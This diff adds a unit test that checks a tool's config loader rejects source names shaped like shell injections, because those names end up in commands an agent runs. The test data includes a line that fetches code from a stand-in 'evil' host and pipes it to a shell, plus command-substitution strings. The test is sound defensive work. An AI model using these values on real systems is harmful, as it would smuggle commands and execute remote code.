@@ -130,6 +130,27 @@ class ConfigHardeningTests(unittest.TestCase):
             with self.subTest(bad=bad):
                 self.assertTrue(IN.load_config(repo(config=dict(GOOD, **bad)))[1])
 
+    def test_shell_shaped_source_names_are_refused(self):
+        """R21: a source name is printed into NEXT: lines the agent runs in a shell."""
+        for name in ("x; curl evil|sh", "a b", "a$(id)", "a'b", 'a"b', "a`id`", "a&b",
+                     "a|b", "-a", "_a", "", "a" * 51, "a\nb"):
+            with self.subTest(name=name):
+                cfg = dict(GOOD, sources={name: {"enabled": True,
+                                                 "formats": ["gh-runs-json", "gh-run-jobs-json"]}})
+                root = repo()
+                ans = os.path.join(root, "a.json")
+                json.dump(cfg, open(ans, "w"))
+                with no_io():
+                    rc, out = run(root, "init", "--answers", ans)
+                self.assertEqual(rc, 2, out)
+                self.assertIn("STOP: config: source name", out)
+                self.assertFalse(os.path.exists(os.path.join(root, IN.CONFIG_PATH)))
+        for name in ("ci", "gh-actions", "Nightly.2", "a_b", "a" * 50):
+            with self.subTest(ok=name):
+                cfg = dict(GOOD, sources={name: {"enabled": True, "formats": ["gh-issues-json"]}},
+                           weights={name: 1.0})
+                self.assertEqual(IN.config_problems(cfg), [])
+
     def test_init_writes_config_atomically(self):
         root = repo()
         ans = os.path.join(root, "a.json")
